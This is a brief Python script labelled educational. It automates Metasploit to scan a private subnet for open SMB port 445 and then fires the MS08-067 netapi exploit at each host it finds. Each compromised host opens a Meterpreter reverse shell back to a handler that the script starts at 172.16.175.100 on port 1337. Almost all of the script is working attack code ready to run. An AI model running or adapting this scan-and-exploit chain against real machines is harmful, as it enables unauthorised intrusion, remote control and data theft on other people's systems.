#!/usr/bin/python

### Created by @jgaudard
### For educational use only
### Version 0.9



import socket as sk
import subprocess, shlex
 
### Variables
targets = []
payload = 'windows/meterpreter/reverse_tcp'
 
 
### Scans target network for open port 445
def scanner(ipsub, ipnet1, ipnet2, portrange):
	print('running scanner')
        for octect in range(ipnet1,ipnet2):
                test = ipsub + '.' + str(octect)
                for port in range(portrange, portrange + 1):
                        try:
                               
                                network = ipsub + '.' + str(octect)
                               
                                s=sk.socket(sk.AF_INET, sk.SOCK_STREAM)
                                s.settimeout(1)
                                s.connect((network, port))
                                targets.append(network)
                                s.close
                        except: continue
 
### Starts MSF Handler
def msfhandler():
        print('Starting Handler')
        handler = subprocess.Popen(shlex.split('gnome-terminal -x msfcli exploit/multi/handler payload=windows/meterpreter/reverse_tcp lhost=172.16.175.100 lport=1337 E'))
       
 
### the autopwn
def autopwn(targets):
	print('starting to autopwn targets')
	for target in targets:
		subprocess.Popen(shlex.split('msfcli windows/smb/ms08_067_netapi payload=windows/meterpreter/reverse_tcp rhost=%s lhost=172.16.175.100 lport=1337 DisablePayloadHandler=true E' % target))
	


msfhandler()
scanner('172.16.175', 9, 11, 445)
autopwn(targets)


